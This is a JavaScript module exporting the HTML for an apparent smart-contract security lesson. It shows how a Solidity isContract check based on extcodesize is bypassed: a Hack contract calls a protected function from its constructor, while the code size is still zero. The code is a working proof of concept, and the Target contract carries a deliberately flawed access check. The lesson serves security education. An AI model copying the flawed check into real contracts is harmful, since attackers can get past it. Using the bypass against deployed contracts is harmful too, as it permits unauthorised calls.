// metadata
export const version = "0.8.10"
export const title = "Bypass Contract Size Check"
export const description = "An example of bypassing contract size check"

const html = `<h3 id="vulnerability">Vulnerability</h3>
<p>If an address is a contract then the size of code stored at the address will be greater than 0 right?</p>
<p>Let&#39;s see how we can create a contract with code size returned by <code>extcodesize</code> equal to 0.</p>
<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.8.10;</span>

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Target</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isContract</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> account</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bool</span></span>) </span>{
        <span class="hljs-comment">// This method relies on extcodesize, which returns 0 for contracts in</span>
        <span class="hljs-comment">// construction, since the code is only stored at the end of the</span>
        <span class="hljs-comment">// constructor execution.</span>
        <span class="hljs-keyword">uint</span> size;
        <span class="hljs-keyword">assembly</span> {
            size <span class="hljs-operator">:=</span> <span class="hljs-built_in">extcodesize</span>(account)
        }
        <span class="hljs-keyword">return</span> size <span class="hljs-operator">&gt;</span> <span class="hljs-number">0</span>;
    }

    <span class="hljs-keyword">bool</span> <span class="hljs-keyword">public</span> pwned <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">protected</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> </span>{
        <span class="hljs-built_in">require</span>(<span class="hljs-operator">!</span>isContract(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>), <span class="hljs-string">"no contract allowed"</span>);
        pwned <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;
    }
}

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">FailedAttack</span> </span>{
    <span class="hljs-comment">// Attempting to call Target.protected will fail,</span>
    <span class="hljs-comment">// Target block calls from contract</span>
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pwn</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _target</span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> </span>{
        <span class="hljs-comment">// This will fail</span>
        Target(_target).protected();
    }
}

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Hack</span> </span>{
    <span class="hljs-keyword">bool</span> <span class="hljs-keyword">public</span> isContract;
    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> addr;

    <span class="hljs-comment">// When contract is being created, code size (extcodesize) is 0.</span>
    <span class="hljs-comment">// This will bypass the isContract() check</span>
    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _target</span>) </span>{
        isContract <span class="hljs-operator">=</span> Target(_target).isContract(<span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>));
        addr <span class="hljs-operator">=</span> <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>);
        <span class="hljs-comment">// This will work</span>
        Target(_target).protected();
    }
}
</code></pre>
`

export default html
